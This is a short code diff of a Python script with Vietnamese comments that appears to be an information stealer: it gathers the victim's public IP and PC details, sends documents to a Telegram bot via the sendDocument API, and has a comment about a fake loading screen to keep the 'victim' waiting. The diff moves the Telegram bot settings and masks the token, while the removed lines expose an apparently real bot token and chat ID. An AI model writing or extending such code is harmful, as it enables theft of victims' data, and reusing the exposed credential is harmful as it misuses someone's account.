@@ -31,6 +31,11 @@ def get_public_ip():
     except Exception as e:
         return f"Lỗi: {e}"
 
+# Thông tin Telegram Bot
+TOKEN = "####################"
+CHAT_ID = "############"
+TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
 def get_pc_info():
     info = {}
     info["System"] = platform.system()
@@ -296,11 +301,6 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
     concurrent.futures.wait(futures)
     for future in futures:
         future.result()  
-
-# Thông tin Telegram Bot
-TOKEN = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
-CHAT_ID = "6186621815"
-TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 
 # Fake loading để giữ nạn nhân ở lại
 def fake_loading():
